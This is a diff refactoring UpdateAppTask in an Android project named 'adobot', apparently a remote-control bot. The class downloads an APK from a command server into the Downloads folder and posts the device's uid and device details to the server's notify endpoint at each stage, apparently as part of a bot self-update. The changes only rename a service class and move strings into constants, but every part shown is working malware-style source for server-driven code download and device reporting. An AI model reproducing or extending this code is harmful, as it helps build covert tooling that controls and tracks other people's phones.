@@ -7,8 +7,9 @@ import android.os.Environment;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandReceiverService;
+import com.android.adobot.CommandService;
 import com.android.adobot.CommonParams;
+import com.android.adobot.Constants;
 import com.android.adobot.activities.UpdateActivity;
 
 import java.io.BufferedInputStream;
@@ -21,12 +22,12 @@ import java.net.URLConnection;
 import java.util.HashMap;
 
 import com.android.adobot.http.Http;
+import com.android.adobot.http.HttpRequest;
 
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
 public class UpdateAppTask extends BaseTask {
     private static final String TAG = "UpdateAppTask";
-    public static final String PKG_FILE = "update.apk";
     private CommonParams commonParams;
     private URL url;
 
@@ -38,7 +39,7 @@ public class UpdateAppTask extends BaseTask {
         }
     }
 
-    public void setContext(CommandReceiverService c) {
+    public void setContext(CommandService c) {
         super.setContext(c);
         context = c;
         this.commonParams = new CommonParams(c);
@@ -55,7 +56,7 @@ public class UpdateAppTask extends BaseTask {
 
                 File file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                 file.mkdirs();
-                File outputFile = new File(file, PKG_FILE);
+                File outputFile = new File(file, Constants.UPDATE_PKG_FILE_NAME);
                 if (outputFile.exists()) {
                     outputFile.delete();
                 }
@@ -70,12 +71,10 @@ public class UpdateAppTask extends BaseTask {
                 dlStarted.put("uid", commonParams.getUid());
                 dlStarted.put("device", commonParams.getDevice());
                 Http doneSMS = new Http();
-                doneSMS.setUrl(commonParams.getServer() + "/notify");
-                doneSMS.setMethod("POST");
+                doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+                doneSMS.setMethod(HttpRequest.METHOD_POST);
                 doneSMS.setParams(dlStarted);
                 doneSMS.execute();
-
-
 
                 byte[] buffer = new byte[1024];
                 int len1 = 0;
@@ -94,8 +93,8 @@ public class UpdateAppTask extends BaseTask {
                 dlComplete.put("uid", commonParams.getUid());
                 dlComplete.put("device", commonParams.getDevice());
                 Http DlDone = new Http();
-                DlDone.setUrl(commonParams.getServer() + "/notify");
-                DlDone.setMethod("POST");
+                DlDone.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+                DlDone.setMethod(HttpRequest.METHOD_POST);
                 DlDone.setParams(dlComplete);
                 DlDone.execute();
 
@@ -112,8 +111,8 @@ public class UpdateAppTask extends BaseTask {
                 noPermit.put("device", commonParams.getDevice());
                 noPermit.put("error", "Download failed");
                 Http doneSMS = new Http();
-                doneSMS.setUrl(commonParams.getServer() + "/notify");
-                doneSMS.setMethod("POST");
+                doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+                doneSMS.setMethod(HttpRequest.METHOD_POST);
                 doneSMS.setParams(noPermit);
                 doneSMS.execute();
 
@@ -126,8 +125,8 @@ public class UpdateAppTask extends BaseTask {
             noPermit.put("device", commonParams.getDevice());
             noPermit.put("permission", "WRITE_EXTERNAL_STORAGE");
             Http doneSMS = new Http();
-            doneSMS.setUrl(commonParams.getServer() + "/notify");
-            doneSMS.setMethod("POST");
+            doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            doneSMS.setMethod(HttpRequest.METHOD_POST);
             doneSMS.setParams(noPermit);
             doneSMS.execute();
 
